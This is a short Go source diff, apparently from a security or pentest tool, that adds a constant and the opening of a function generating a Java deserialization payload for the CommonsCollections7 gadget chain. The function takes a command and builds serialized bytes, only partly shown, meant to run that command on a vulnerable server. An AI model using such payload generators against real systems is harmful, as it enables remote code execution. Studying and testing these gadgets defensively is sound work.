@@ -7,6 +7,8 @@ import (
 	"strings"
 )
 
+const CC7 = "CommonsCollections7"
+
 func GetCommonsCollections7(cmd string) []byte {
 	prefix := "ACED0005737200136A6176612E7574696C2E486173687461626C6513BB0" +
 		"F25214AE4B803000246000A6C6F6164466163746F724900097468726573686F6C" +
